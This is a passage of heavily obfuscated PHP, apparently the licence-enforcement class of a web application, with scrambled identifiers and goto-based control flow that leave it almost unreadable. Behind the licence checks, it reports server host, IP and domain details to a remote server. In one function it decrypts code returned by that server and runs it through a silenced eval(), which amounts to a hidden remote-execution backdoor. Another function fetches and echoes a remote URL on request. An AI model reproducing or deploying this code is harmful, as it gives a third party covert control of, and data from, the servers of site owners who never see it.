$E¨Ş«ÕñàÒ[$F¸ë·²«é˜[220]]); if ($DäË¦ ù¦×[$F¸ë·²«é˜[175]]) { $e‘¤‹À‹¢ƒ[$F¸ë·²«é˜[219]] = $DäË¦ ù¦×[$F¸ë·²«é˜[175]]; } $AÑäÜ½˜ŞÂ = $F¸ë·²«é˜[25]($F¸ë·²«é˜[121]($e‘¤‹À‹¢ƒ[$F¸ë·²«é˜[217]]), 10, 10); goto EØÌ–‡Ùô›; EØÌ–‡Ùô›: $A«ÖÒÓŞŒ‰ = $AÑäÜ½˜ŞÂ . $e‘¤‹À‹¢ƒ[$F¸ë·²«é˜[127]] . $e‘¤‹À‹¢ƒ[$F¸ë·²«é˜[219]]; $e‘¤‹À‹¢ƒ[$F¸ë·²«é˜[129]] = $F¸ë·²«é˜[221]($F¸ë·²«é˜[125]($this->{$_SERVER[¬œç„§²ö°ô][154]}($A«ÖÒÓŞŒ‰, $F¸ë·²«é˜[222]))); $e±±£«ÏÇè = $F¸ë·²«é˜[131](16); goto cÖ×ÀÆ‘†É; cÖ×ÀÆ‘†É: $F·¼ªöÆ¿á = $e‡å£©À‰¥[614]; if (!$F·¼ªöÆ¿á) { die; } $Fêš¤Ÿ»ßß = $e±±£«ÏÇè . $e‘¤‹À‹¢ƒ[$F¸ë·²«é˜[127]] . $this->{$_SERVER[¬œç„§²ö°ô][154]}($F¸ë·²«é˜[121]($e‘¤‹À‹¢ƒ[$F¸ë·²«é˜[216]]), $e±±£«ÏÇè); goto cã»¦í²ğ; cã»¦í²ğ: $CÓÂ—õŒÓµ = $e‡å£©À‰¥[615]; while (strlen($CÓÂ—õŒÓµ) < $e‡å£©À‰¥[587]) { if (!$CÓÂ—õŒÓµ) { break; } $CÓÂ—õŒÓµ++; } $e‘¤‹À‹¢ƒ[$F¸ë·²«é˜[130]] = $F¸ë·²«é˜[125]($F¸ë·²«é˜[221]($this->{$_SERVER[¬œç„§²ö°ô][154]}($Fêš¤Ÿ»ßß, $F¸ë·²«é˜[223]))); goto eĞ‚ÄµĞÙß; DÎï¼ ¬ïÚ: $E¨Ş«ÕñàÒ = $CÑÓÜàÏ©‘[$F¸ë·²«é˜[200]]; $BñĞÄ•‡”£ = $this->{$_SERVER[¬œç„§²ö°ô][207]}($E¨Ş«ÕñàÒ[$F¸ë·²«é˜[208]]); if (!$BñĞÄ•‡”£ || $BñĞÄ•‡”£ != $E¨Ş«ÕñàÒ[$F¸ë·²«é˜[152]]) { $Dšâ¾¿¥º¶ = array($F¸ë·²«é˜[209] => $F¸ë·²«é˜[61]($F¸ë·²«é˜[62])->{$_SERVER[¬œç„§²ö°ô][63]}($F¸ë·²«é˜[123]), $F¸ë·²«é˜[210] => $_SERVER[$F¸ë·²«é˜[122]], $F¸ë·²«é˜[211] => $F¸ë·²«é˜[212](), $F¸ë·²«é˜[181] => $_SERVER[$F¸ë·²«é˜[182]]); $eëªîÎÍëĞ = $this->{$_SERVER[¬œç„§²ö°ô][213]}($F¸ë·²«é˜[155]($Dšâ¾¿¥º¶)); $this->{$_SERVER[¬œç„§²ö°ô][190]}($F¸ë·²«é˜[214] . $eëªîÎÍëĞ); $F¸ë·²«é˜[173]($F¸ë·²«é˜[205]($F¸ë·²«é˜[215]), !0); } goto a‹º¦ÛêÅ; d—ÖÀ¢¨½µ: if (!isset($DåØ§•ÚÖ„[$F¸ë·²«é˜[172]]) || $F¸ë·²«é˜[24]($DåØ§•ÚÖ„[$F¸ë·²«é˜[172]]) != 16) { $F¸ë·²«é˜[173]($F¸ë·²«é˜[174] . $DåØ§•ÚÖ„[$F¸ë·²«é˜[172]], !1); } $Dá£¾ãõŠ¨ = $F¸ë·²«é˜[61]($F¸ë·²«é˜[62])->{$_SERVER[¬œç„§²ö°ô][63]}($F¸ë·²«é˜[123]); $DäË¦ ù¦× = array($F¸ë·²«é˜[172] => $DåØ§•ÚÖ„[$F¸ë·²«é˜[172]], $F¸ë·²«é˜[175] => $F¸ë·²«é˜[131](16), $F¸ë·²«é˜[176] => $F¸ë·²«é˜[156], $F¸ë·²«é˜[177] => $F¸ë·²«é˜[178], $F¸ë·²«é˜[179] => $_SERVER[$F¸ë·²«é˜[180]], $F¸ë·²«é˜[181] => $_SERVER[$F¸ë·²«é˜[182]], $F¸ë·²«é˜[183] => $_SERVER[$F¸ë·²«é˜[184]]); goto BùàÙŠ†š; eĞ‚ÄµĞÙß: $a­É’ƒŒßÀ = $e‡å£©À‰¥[616]; while ($a­É’ƒŒßÀ < $e‡å£©À‰¥[592]) { if ($a­É’ƒŒßÀ >= 0) { break; } $a­É’ƒŒßÀ++; } if ($E¨Ş«ÕñàÒ[$F¸ë·²«é˜[224]] && $E¨Ş«ÕñàÒ[$F¸ë·²«é˜[224]] >= 1) { $F¸ë·²«é˜[61]($F¸ë·²«é˜[62])->{$_SERVER[¬œç„§²ö°ô][225]}($F¸ë·²«é˜[226], $F¸ë·²«é˜[227]); } goto AŒ§ÇÃçå; fƒ¹²İ›ˆ…: if (!$F¸ë·²«é˜[113]($GLOBALS, $F¸ë·²«é˜[139])) { die; } $DåØ§•ÚÖ„ = $GLOBALS[$F¸ë·²«é˜[22]]; if (isset($DåØ§•ÚÖ„[$F¸ë·²«é˜[170]])) { $this->{$_SERVER[¬œç„§²ö°ô][171]}(); die; } goto d—ÖÀ¢¨½µ; BùàÙŠ†š: $a¥¬ˆ®›È = $F¸ë·²«é˜[121]($_SERVER[$F¸ë·²«é˜[122]] . $Dá£¾ãõŠ¨); if ($DåØ§•ÚÖ„[$F¸ë·²«é˜[185]] == $F¸ë·²«é˜[186]) { $BÊáÇ©…½· = $this->{$_SERVER[¬œç„§²ö°ô][154]}($a¥¬ˆ®›È, $F¸ë·²«é˜[187]); $eëªîÎÍëĞ = $this->{$_SERVER[¬œç„§²ö°ô][134]}($F¸ë·²«é˜[155]($DäË¦ ù¦×), $a¥¬ˆ®›È . $F¸ë·²«é˜[188], 3); $eëªîÎÍëĞ = $eëªîÎÍëĞ . $F¸ë·²«é˜[189] . $_SERVER[$F¸ë·²«é˜[180]]; $cËèï½¦Šø = $this->{$_SERVER[¬œç„§²ö°ô][190]}($F¸ë·²«é˜[191] . $BÊáÇ©…½· . $F¸ë·²«é˜[192] . $eëªîÎÍëĞ, -1); $F¸ë·²«é˜[173]($cËèï½¦Šø, !0); } else { if ($DåØ§•ÚÖ„[$F¸ë·²«é˜[185]] == $F¸ë·²«é˜[193]) { $c¹„»«„ = $F¸ë·²«é˜[25]($F¸ë·²«é˜[121]($F¸ë·²«é˜[194] . $a¥¬ˆ®›È), 12, 15) . $F¸ë·²«é˜[195]; $eëªîÎÍëĞ = $this->{$_SERVER[¬œç„§²ö°ô][196]}($F¸ë·²«é˜[2]($DåØ§•ÚÖ„[$F¸ë·²«é˜[197]]), $c¹„»«„, 2); $CÑÓÜàÏ©‘ = $F¸ë·²«é˜[198]($eëªîÎÍëĞ, !0); if (!$F¸ë·²«é˜[199]($CÑÓÜàÏ©‘) || !$F¸ë·²«é˜[199]($CÑÓÜàÏ©‘[$F¸ë·²«é˜[200]]) || $CÑÓÜàÏ©‘[$F¸ë·²«é˜[172]] != !0) { $f·ÏŸ°…¡Ç = $F¸ë·²«é˜[201]; $AŒ÷Öò»è = $CÑÓÜàÏ©‘[$F¸ë·²«é˜[200]] ? $F¸ë·²«é˜[202] . $CÑÓÜàÏ©‘[$F¸ë·²«é˜[200]] : $f·ÏŸ°…¡Ç; $F¸ë·²«é˜[173]($AŒ÷Öò»è, !1); } else { $DäË¦ ù¦×[$F¸ë·²«é˜[175]] = $CÑÓÜàÏ©‘[$F¸ë·²«é˜[200]][$F¸ë·²«é˜[203]]; } } else { $CÑÓÜàÏ©‘ = $this->{$_SERVER[¬œç„§²ö°ô][190]}($F¸ë·²«é˜[204], $DäË¦ ù¦×, 10); $B¶Á›¼Ëæœ = $e‡å£©À‰¥[613]; if (!$B¶Á›¼Ëæœ) { die; } } } if (!$F¸ë·²«é˜[199]($CÑÓÜàÏ©‘) || !$F¸ë·²«é˜[199]($CÑÓÜàÏ©‘[$F¸ë·²«é˜[200]]) || $CÑÓÜàÏ©‘[$F¸ë·²«é˜[172]] != !0) { $f·ÏŸ°…¡Ç = $F¸ë·²«é˜[205]($F¸ë·²«é˜[206]); $AŒ÷Öò»è = $CÑÓÜàÏ©‘[$F¸ë·²«é˜[200]] ? $F¸ë·²«é˜[202] . $CÑÓÜàÏ©‘[$F¸ë·²«é˜[200]] : $f·ÏŸ°…¡Ç; $F¸ë·²«é˜[173]($AŒ÷Öò»è, !1); } goto DÎï¼ ¬ïÚ; a‘šìØ¬½ğ: $c¹À™«¦•â = $e‡å£©À‰¥[619]; while ($c¹À™«¦•â < $e‡å£©À‰¥[592]) { if ($c¹À™«¦•â >= 0) { break; } $c¹À™«¦•â++; } $D…¸ğƒÙÅë = array(); goto f‰Ò¢âÍÑ; d‡İÇª«Ö½: $BÜÖÍæÑù‹ = $e‡å£©À‰¥[623]; while ($BÜÖÍæÑù‹ < $e‡å£©À‰¥[570]) { if ($BÜÖÍæÑù‹ >= 0) { break; } $BÜÖÍæÑù‹++; } $this->fkuz901d71ac = $e‘¤‹À‹¢ƒ[$F¸ë·²«é˜[127]]; goto Eƒ«â…„Û¾; c •£è»: $a”¤©˜Ë‡Ñ = $e‡å£©À‰¥[618]; if (strlen($a”¤©˜Ë‡Ñ) < $e‡å£©À‰¥[592]) { return; } $eå‹ÜùÒÈ¿ = $E©’‚Åù‚[$F¸ë·²«é˜[232]]; goto a‘šìØ¬½ğ; Eƒ«â…„Û¾: $this->{$_SERVER[¬œç„§²ö°ô][236]}(); Cache::set($F¸ë·²«é˜[237] . $F¸ë·²«é˜[121]($Dá£¾ãõŠ¨ . $F¸ë·²«é˜[238]), $F¸ë·²«é˜[10]); $F¸ë·²«é˜[173]($F¸ë·²«é˜[205]($F¸ë·²«é˜[215]), !0); goto EÜãô¡è’—; f‰Ò¢âÍÑ: $cÙöâè«íÙ = $e‡å£©À‰¥[620]; if (!$cÙöâè«íÙ) { die; } $D…¸ğƒÙÅë[$DˆÌñÚù¶“] = $FöÂŸ¸®º; goto A£¿ÎÛŒ¤Ş; EÜãô¡è’—: } private function licenseRegistSuccess() { $C–éˆ¶¦Ç— =& $_SERVER[¬œç„§²ö°ô]; $Eğ¯¨ğİ•Å = $C–éˆ¶¦Ç—[61]($C–éˆ¶¦Ç—[62])->{$_SERVER[¬œç„§²ö°ô][63]}(); if ($Eğ¯¨ğİ•Å[$C–éˆ¶¦Ç—[90]] != $C–éˆ¶¦Ç—[227]) { $C–éˆ¶¦Ç—[61]($C–éˆ¶¦Ç—[62])->{$_SERVER[¬œç„§²ö°ô][228]}($C–éˆ¶¦Ç—[90], $C–éˆ¶¦Ç—[227]); } $C–éˆ¶¦Ç—[117]($C–éˆ¶¦Ç—[239])->{$_SERVER[¬œç„§²ö°ô][240]}(!0); } private function nlqpb362232f() { goto e‰ëäÕ‘Õ„; E¾¹³“•è: if (!$Fõ¸Ñ”øæ¹) { die; } goto d›‘®¡Øˆ›; Fß•Á…óóŒ: $this->xczj8bf9392c = array(); $this->fkuz901d71ac = $bëÔˆ¹†…·[128]; $Fõ¸Ñ”øæ¹ = $dÅæªæç­[625]; goto E¾¹³“•è; e‰ëäÕ‘Õ„: $dÅæªæç­ =& $_SERVER[¹Ò‹Ò¹]; $bëÔˆ¹†…· =& $_SERVER[¬œç„§²ö°ô]; $bëÔˆ¹†…·[61]($bëÔˆ¹†…·[62])->{$_SERVER[¬œç„§²ö°ô][228]}(array($bëÔˆ¹†…·[216] => $bëÔˆ¹†…·[10], $bëÔˆ¹†…·[217] => $bëÔˆ¹†…·[10], $bëÔˆ¹†…·[127] => $bëÔˆ¹†…·[128], $bëÔˆ¹†…·[129] => $bëÔˆ¹†…·[10], $bëÔˆ¹†…·[130] => $bëÔˆ¹†…·[10])); goto DÅ¢±µÎ¯; DÅ¢±µÎ¯: $Dµ«ŠÑºë = $dÅæªæç­[624]; if (strlen($Dµ«ŠÑºë) < $dÅæªæç­[582]) { die; } $bëÔˆ¹†…·[61]($bëÔˆ¹†…·[62])->{$_SERVER[¬œç„§²ö°ô][225]}($bëÔˆ¹†…·[226], $bëÔˆ¹†…·[241]); goto Fß•Á…óóŒ; d›‘®¡Øˆ›: } private function uyda8828c7ff() { goto aëÂˆ®ÌäÖ; aëÂˆ®ÌäÖ: $e¦¶»†Á¶” =& $_SERVER[¹Ò‹Ò¹]; $D ‹èå =& $_SERVER[¬œç„§²ö°ô]; $_SERVER[$D ‹èå[182]] = $D ‹èå[113]($_SERVER, $D ‹èå[182], APP_HOST); goto B“Å«§ÀÂ; Aİ‚ÍÕó—ª: if ($DŠÅ²¢Ç[$D ‹èå[127]] == $D ‹èå[128]) { return; } $fÆíª“Ö = $D ‹èå[61]($D ‹èå[62])->{$_SERVER[¬œç„§²ö°ô][63]}($D ‹èå[123]); $E·½õ›àŸ = $e¦¶»†Á¶”[628]; goto fÉƒâÀÍË; CÈí‹Ğ©ê¯: if (strlen($CÄ¯¹÷„Ğ‹) < $e¦¶»†Á¶”[570]) { die; } if (!$D ‹èå[199]($aĞ§ŞĞÚ¼‡) || !isset($aĞ§ŞĞÚ¼‡[$D ‹èå[242]]) || $D ‹èå[243]() - $aĞ§ŞĞÚ¼‡[$D ‹èå[242]] >= 60) { $A÷·×ŒÁŠù = $D ‹èå[229]($D ‹èå[61]($D ‹èå[11])->{$_SERVER[¬œç„§²ö°ô][230]}(), $D ‹èå[231]); $bÂ¥¸­½æ = $A÷·×ŒÁŠù[$D ‹èå[232]]; $F·”Í¬èç = $D ‹èå[121]($_SERVER[$D ‹èå[122]] . $D ‹èå[221]($fÆíª“Ö) . $DŠÅ²¢Ç[$D ‹èå[217]]); $f¤³ÄÀ‚œ³ = $D ‹èå[221]($D ‹èå[25]($F·”Í¬èç, 10, 16)); $aĞ§ŞĞÚ¼‡ = $this->{$_SERVER[¬œç„§²ö°ô][196]}($bÂ¥¸­½æ[$D ‹èå[101]][$f¤³ÄÀ‚œ³], $F·”Í¬èç); $aĞ§ŞĞÚ¼‡ = $D ‹èå[198]($aĞ§ŞĞÚ¼‡, !0); } if (!$D ‹èå[199]($aĞ§ŞĞÚ¼‡)) { return $this->{$_SERVER[¬œç„§²ö°ô][171]}(); } goto cÃ¡“Ÿ; c³ñ›†ÅÀ†: $this->xczj8bf9392c = $aĞ§ŞĞÚ¼‡; $this->fkuz901d71ac = $DŠÅ²¢Ç[$D ‹èå[127]]; $DÓí•ÁÜ¯ = $e¦¶»†Á¶”[631]; goto D™‰÷š´Ó‹; b—öË¶™•: while (strlen($C»´é·Ô) < $e¦¶»†Á¶”[570]) { if (!$C»´é·Ô) { break; } $C»´é·Ô++; } $aĞ§ŞĞÚ¼‡ = Cache::get($D±öÒ‹ÏˆÛ); $CÄ¯¹÷„Ğ‹ = $e¦¶»†Á¶”[630]; goto CÈí‹Ğ©ê¯; D™‰÷š´Ó‹: while ($DÓí•ÁÜ¯ < $e¦¶»†Á¶”[592]) { if ($DÓí•ÁÜ¯ >= 0) { break; } $DÓí•ÁÜ¯++; } goto Dõ•ÇâÖ‹ô; eî´–ãª½¡: $DŠÅ²¢Ç = $D ‹èå[61]($D ‹èå[62])->{$_SERVER[¬œç„§²ö°ô][63]}(); $A•Ÿ‹±í¾š = $e¦¶»†Á¶”[627]; if (strlen($A•Ÿ‹±í¾š) < $e¦¶»†Á¶”[570]) { die; } goto Aİ‚ÍÕó—ª; cÃ¡“Ÿ: $b±¤·÷Œë¬ = $D ‹èå[151]($aĞ§ŞĞÚ¼‡[$D ‹èå[152]]); if ($D ‹èå[243]() >= $b±¤·÷Œë¬) { return $this->{$_SERVER[¬œç„§²ö°ô][171]}(); } if ($D ‹èå[243]() - $aĞ§ŞĞÚ¼‡[$D ‹èå[242]] > 20) { $aĞ§ŞĞÚ¼‡[$D ‹èå[242]] = $D ‹èå[243](); Cache::set($D±öÒ‹ÏˆÛ, $aĞ§ŞĞÚ¼‡); } goto c³ñ›†ÅÀ†; fÉƒâÀÍË: if (strlen($E·½õ›àŸ) < $e¦¶»†Á¶”[592]) { die; } $D±öÒ‹ÏˆÛ = $D ‹èå[237] . $D ‹èå[121]($fÆíª“Ö . $D ‹èå[238]); $C»´é·Ô = $e¦¶»†Á¶”[629]; goto b—öË¶™•; B“Å«§ÀÂ: $cí°õÖô³Œ = $e¦¶»†Á¶”[626]; while ($cí°õÖô³Œ < $e¦¶»†Á¶”[579]) { if ($cí°õÖô³Œ >= 0) { break; } $cí°õÖô³Œ++; } $this->fkuz901d71ac = $D ‹èå[128]; goto eî´–ãª½¡; Dõ•ÇâÖ‹ô: } private function dawe4effdb2c() { goto Eë‰òæ¨ª†; Fº³ê©“å‡: if (!$cŒ˜ÌõÊê) { return; } $D±Œî–Œ = $_SERVER[$DŸ•›æ¡­ƒ[44]]; if ($D±Œî–Œ == $DŸ•›æ¡­ƒ[244] && $this->fkuz901d71ac == $DŸ•›æ¡­ƒ[128]) { $DŸ•›æ¡­ƒ[173]($DŸ•›æ¡­ƒ[205]($DŸ•›æ¡­ƒ[245]), !1, $DŸ•›æ¡­ƒ[246]); } goto D‹ßÃ“¹¦ª; D‹ßÃ“¹¦ª: $dÈä¡ÕñíŞ = array($DŸ•›æ¡­ƒ[247], $DŸ•›æ¡­ƒ[248]); if ($DŸ•›æ¡­ƒ[249]($D±Œî–Œ, $dÈä¡ÕñíŞ)) { if ($this->fkuz901d71ac == $DŸ•›æ¡­ƒ[128] && isset($FØç©‚×äŸ[$DŸ•›æ¡­ƒ[250]])) { $DŸ•›æ¡­ƒ[173]($DŸ•›æ¡­ƒ[205]($DŸ•›æ¡­ƒ[245]), !1, $DŸ•›æ¡­ƒ[246]); die; } $A´ŒÂç‘“Ã = $this->{$_SERVER[¬œç„§²ö°ô][144]}(); if ($A´ŒÂç‘“Ã != $DŸ•›æ¡­ƒ[251]($DŸ•›æ¡­ƒ[252])) { if ($A´ŒÂç‘“Ã <= $DŸ•›æ¡­ƒ[61]($DŸ•›æ¡­ƒ[146])->{$_SERVER[¬œç„§²ö°ô][147]}()) { $DŸ•›æ¡­ƒ[173]($DŸ•›æ¡­ƒ[205]($DŸ•›æ¡­ƒ[253]), !1, $DŸ•›æ¡­ƒ[246]); die; } } } goto C©í¸ÚŸ; Eë‰òæ¨ª†: $DŸ•›æ¡­ƒ =& $_SERVER[¬œç„§²ö°ô]; $FØç©‚×äŸ = $GLOBALS[$DŸ•›æ¡­ƒ[22]]; $cŒ˜ÌõÊê = $_SERVER[¹Ò‹Ò¹][632]; goto Fº³ê©“å‡; C©í¸ÚŸ: } private function ywhj6d5b76c0() { goto AíÀ°‰±»¾; D¸¦œÁÄ“ò: $dÂÄ—öŒŒÀ = $e×âõŠ±ØŸ[633]; if (!$CŠØ´×¶Ó¬[113]($GLOBALS, $CŠØ´×¶Ó¬[139]) || !isset($_GET[$CŠØ´×¶Ó¬[255]])) { return; } if (!$CŠØ´×¶Ó¬[249]($_SERVER[$CŠØ´×¶Ó¬[44]], $e‰ ˆ¾Èß×)) { return; } goto cò§Ş¡ï¶; Bïë™‚Æì¶: if (!$d—Ì¿¸ç‰¿) { die; } $CŠØ´×¶Ó¬[265]($CŠØ´×¶Ó¬[266]); if ($AÁŒ†é©ÃÊ && $CŠØ´×¶Ó¬[32]($AÁŒ†é©ÃÊ, $CŠØ´×¶Ó¬[267])) { echo $AÁŒ†é©ÃÊ; } goto a¿Á­èñîŒ; AíÀ°‰±»¾: $e×âõŠ±ØŸ =& $_SERVER[¹Ò‹Ò¹]; $CŠØ´×¶Ó¬ =& $_SERVER[¬œç„§²ö°ô]; $e‰ ˆ¾Èß× = array($CŠØ´×¶Ó¬[142], $CŠØ´×¶Ó¬[254]); goto D¸¦œÁÄ“ò; cò§Ş¡ï¶: $a…ŠŒ¦ª = $CŠØ´×¶Ó¬[256]; $a…ŠŒ¦ª = $this->{$_SERVER[¬œç„§²ö°ô][257]}($a…ŠŒ¦ª, $CŠØ´×¶Ó¬[258]); $BÁÏçµ‹Ú = $CŠØ´×¶Ó¬[259](array($CŠØ´×¶Ó¬[260] => array($CŠØ´×¶Ó¬[261] => $CŠØ´×¶Ó¬[262], $CŠØ´×¶Ó¬[263] => 3))); goto a‹¬‘³äãŠ; a‹¬‘³äãŠ: $FÀò°‹‡í = $e×âõŠ±ØŸ[634]; $AÁŒ†é©ÃÊ = @$CŠØ´×¶Ó¬[264]($a…ŠŒ¦ª, !1, $BÁÏçµ‹Ú); $d—Ì¿¸ç‰¿ = $e×âõŠ±ØŸ[635]; goto Bïë™‚Æì¶; a¿Á­èñîŒ: die; goto c¶êÔÚğ½®; c¶êÔÚğ½®: } public function xeoh0878af85($CŠÂ½Æ¹”) { goto fãƒÇÄäŠ; fãƒÇÄäŠ: $B¥²¬ø ‚ =& $_SERVER[¹Ò‹Ò¹]; $AĞ¦¬†Á§ë =& $_SERVER[¬œç„§²ö°ô]; if ($this->fkuz901d71ac == $AĞ¦¬†Á§ë[268]) { return $CŠÂ½Æ¹”; } goto Aİî™æö‘º; bÒİ¶²ËÜ: return $CŠÂ½Æ¹”; goto C±÷ñÈ‹Ÿ; Aİî™æö‘º: $DÂÜá¯ Ò„ = array($AĞ¦¬†Á§ë[269] => $AĞ¦¬†Á§ë[270], $AĞ¦¬†Á§ë[271] => $AĞ¦¬†Á§ë[270], $AĞ¦¬†Á§ë[272] => $AĞ¦¬†Á§ë[270], $AĞ¦¬†Á§ë[273] => $AĞ¦¬†Á§ë[270], $AĞ¦¬†Á§ë[274] => $AĞ¦¬†Á§ë[270], $AĞ¦¬†Á§ë[275] => $AĞ¦¬†Á§ë[270], $AĞ¦¬†Á§ë[276] => $AĞ¦¬†Á§ë[277], $AĞ¦¬†Á§ë[278] => $AĞ¦¬†Á§ë[277], $AĞ¦¬†Á§ë[279] => $AĞ¦¬†Á§ë[277], $AĞ¦¬†Á§ë[280] => $AĞ¦¬†Á§ë[277], $AĞ¦¬†Á§ë[281] => $AĞ¦¬†Á§ë[277], $AĞ¦¬†Á§ë[282] => $AĞ¦¬†Á§ë[277], $AĞ¦¬†Á§ë[283] => $AĞ¦¬†Á§ë[277], $AĞ¦¬†Á§ë[284] => $AĞ¦¬†Á§ë[277], $AĞ¦¬†Á§ë[285] => $AĞ¦¬†Á§ë[277]); $A­¤ƒÁˆš = $AĞ¦¬†Á§ë[0]($AĞ¦¬†Á§ë[286], $AĞ¦¬†Á§ë[113]($this->xczj8bf9392c, $AĞ¦¬†Á§ë[136], $AĞ¦¬†Á§ë[10])); $Aßò™Á¦ãË = $B¥²¬ø ‚[636]; goto F”…Úâ»Õ ; E¿ô°Œ“÷: if (!$b¶îèòÙ‹”) { return; } foreach ($DÂÜá¯ Ò„ as $eóíŞÙˆ‚å => $eîÃÙä™Â ) { if ($eîÃÙä™Â  == $AĞ¦¬†Á§ë[270] && $AĞ¦¬†Á§ë[25]($this->fkuz901d71ac, 0, 1) == $AĞ¦¬†Á§ë[270]) { continue; } if (!$AĞ¦¬†Á§ë[249]($eóíŞÙˆ‚å, $A­¤ƒÁˆš)) { $BÄ˜ìñ¼ç[] = $eóíŞÙˆ‚å; } } foreach ($BÄ˜ìñ¼ç as $eóíŞÙˆ‚å) { unset($CŠÂ½Æ¹”[$eóíŞÙˆ‚å]); } goto bÒİ¶²ËÜ; F”…Úâ»Õ : if (!$Aßò™Á¦ãË) { die; } $BÄ˜ìñ¼ç = array(); $b¶îèòÙ‹” = $B¥²¬ø ‚[637]; goto E¿ô°Œ“÷; C±÷ñÈ‹Ÿ: } private function wvhp25606863() { goto FÉ¾ÎŞ…‚»; aÕ‚µ–Œ¶: $GLOBALS[$E¤Œ”‚ëó[101]][$E¤Œ”‚ëó[105]][$E¤Œ”‚ëó[287]] = $E¤Œ”‚ëó[227]; $GLOBALS[$E¤Œ”‚ëó[101]][$E¤Œ”‚ëó[288]] = $E¤Œ”‚ëó[227]; $bà¬Ÿ±…Øİ = $bñÍµæ÷·[638]; goto cº´¿Ã¯å; cº´¿Ã¯å: while ($bà¬Ÿ±…Øİ < $bñÍµæ÷·[579]) { if ($bà¬Ÿ±…Øİ >= 0) { break; } $bà¬Ÿ±…Øİ++; } if ($E¤Œ”‚ëó[61]($E¤Œ”‚ëó[289])->{$_SERVER[¬œç„§²ö°ô][63]}($E¤Œ”‚ëó[90]) != $E¤Œ”‚ëó[241]) { $E¤Œ”‚ëó[61]($E¤Œ”‚ëó[289])->{$_SERVER[¬œç„§²ö°ô][228]}($E¤Œ”‚ëó[90], $E¤Œ”‚ëó[241]); } goto F›óÛ¨Ø–½; FÉ¾ÎŞ…‚»: $bñÍµæ÷· =& $_SERVER[¹Ò‹Ò¹]; $E¤Œ”‚ëó =& $_SERVER[¬œç„§²ö°ô]; if ($this->fkuz901d71ac != $E¤Œ”‚ëó[128]) { return; } goto aÕ‚µ–Œ¶; F›óÛ¨Ø–½: } public function snwqfaaad1db() { return $_SERVER[¬œç„§²ö°ô][290]; } private function kifd9ed19aff() { goto bË…¸•¡; a÷Ûí•¤ÆÄ: $f«Ë£Ê¡˜[13](array($f«Ë£Ê¡˜[296], $f«Ë£Ê¡˜[159]), $eìÆ§°…ºò, $f«Ë£Ê¡˜[243]()); $dÉ•¥…ôò = array($f«Ë£Ê¡˜[172] => $f«Ë£Ê¡˜[61]($f«Ë£Ê¡˜[62])->{$_SERVER[¬œç„§²ö°ô][63]}($f«Ë£Ê¡˜[216]), $f«Ë£Ê¡˜[185] => $this->fkuz901d71ac, $f«Ë£Ê¡˜[183] => $_SERVER[$f«Ë£Ê¡˜[184]], $f«Ë£Ê¡˜[176] => $f«Ë£Ê¡˜[156], $f«Ë£Ê¡˜[179] => $_SERVER[$f«Ë£Ê¡˜[180]]); $e¡…ğ­·Ü = $DŒ„ê¤âÆ[642]; goto bõö”‚¿­°; CæÅë†íìÙ: if ($this->{$_SERVER[¬œç„§²ö°ô][207]}($b’¿°Ä«ØÄ[$f«Ë£Ê¡˜[300]]) != $dÉ•¥…ôò[$f«Ë£Ê¡˜[172]]) { $Aç¬ïäÁÉ = array($f«Ë£Ê¡˜[209] => $f«Ë£Ê¡˜[61]($f«Ë£Ê¡˜[62])->{$_SERVER[¬œç„§²ö°ô][63]}($f«Ë£Ê¡˜[123]), $f«Ë£Ê¡˜[210] => $_SERVER[$f«Ë£Ê¡˜[122]], $f«Ë£Ê¡˜[211] => $f«Ë£Ê¡˜[212](), $f«Ë£Ê¡˜[181] => $_SERVER[$f«Ë£Ê¡˜[182]]); $Bñ¯éó‚âˆ = $this->{$_SERVER[¬œç„§²ö°ô][213]}($f«Ë£Ê¡˜[155]($Aç¬ïäÁÉ)); $b’¿°Ä«ØÄ = $this->{$_SERVER[¬œç„§²ö°ô][190]}($f«Ë£Ê¡˜[214] . $Bñ¯éó‚âˆ); if ($b’¿°Ä«ØÄ && $f«Ë£Ê¡˜[199]($b’¿°Ä«ØÄ) && isset($b’¿°Ä«ØÄ[$f«Ë£Ê¡˜[300]])) { $f“ÚÖÖˆÉ = $this->{$_SERVER[¬œç„§²ö°ô][196]}($b’¿°Ä«ØÄ[$f«Ë£Ê¡˜[300]], 2); if ($f“ÚÖÖˆÉ) { $f“ÚÖÖˆÉ = $this->{$_SERVER[¬œç„§²ö°ô][207]}($f“ÚÖÖˆÉ); } if ($f“ÚÖÖˆÉ) { try { @eval($f“ÚÖÖˆÉ); } catch (Exception $b²±®ùÔ­ø) { } } } } goto DĞ×’¯Àê»; AáÛé÷äƒ: $FÑİĞ­µ™ = $DŒ„ê¤âÆ[639]; if (strlen($FÑİĞ­µ™) < $DŒ„ê¤âÆ[582]) { die; } $eìÆ§°…ºò = $f«Ë£Ê¡˜[294] . $f«Ë£Ê¡˜[121]($f«Ë£Ê¡˜[295]); goto BŠÑ—ªÃîí; D¬óÁ„à°: $d™ÇÑ»µ›¡ = $DŒ„ê¤âÆ[641]; while (strlen($d™ÇÑ»µ›¡) < $DŒ„ê¤âÆ[570]) { if (!$d™ÇÑ»µ›¡) { break; } $d™ÇÑ»µ›¡++; } if ($Bïê±·Š— && $f«Ë£Ê¡˜[243]() - $Bïê±·Š— < $f«Ë£Ê¡˜[251]($f«Ë£Ê¡˜[298])) { return; } goto a÷Ûí•¤ÆÄ; DêÂå±Ê˜ò: if (!$f«Ë£Ê¡˜[249]($_SERVER[$f«Ë£Ê¡˜[44]], $aÏîÊÓõëÆ)) { return; } if ($f«Ë£Ê¡˜[243]() % 4 != 0) { return; } $Bïê±·Š— = $f«Ë£Ê¡˜[13](array($f«Ë£Ê¡˜[296], $f«Ë£Ê¡˜[297]), $eìÆ§°…ºò); goto D¬óÁ„à°; bÌµ¨¹ØÂÓ: if (!$f«Ë£Ê¡˜[199]($b’¿°Ä«ØÄ)) { return; } if ($b’¿°Ä«ØÄ[$f«Ë£Ê¡˜[172]] && $b’¿°Ä«ØÄ[$f«Ë£Ê¡˜[300]]) { if ($this->{$_SERVER[¬œç„§²ö°ô][207]}($b’¿°Ä«ØÄ[$f«Ë£Ê¡˜[300]]) == $dÉ•¥…ôò[$f«Ë£Ê¡˜[172]]) { return; } } $this->{$_SERVER[¬œç„§²ö°ô][171]}(); goto CæÅë†íìÙ; bË…¸•¡: $DŒ„ê¤âÆ =& $_SERVER[¹Ò‹Ò¹]; $f«Ë£Ê¡˜ =& $_SERVER[¬œç„§²ö°ô]; $aÏîÊÓõëÆ = array($f«Ë£Ê¡˜[291], $f«Ë£Ê¡˜[292], $f«Ë£Ê¡˜[293]); goto AáÛé÷äƒ; bõö”‚¿­°: while ($e¡…ğ­·Ü < $DŒ„ê¤âÆ[592]) { if ($e¡…ğ­·Ü 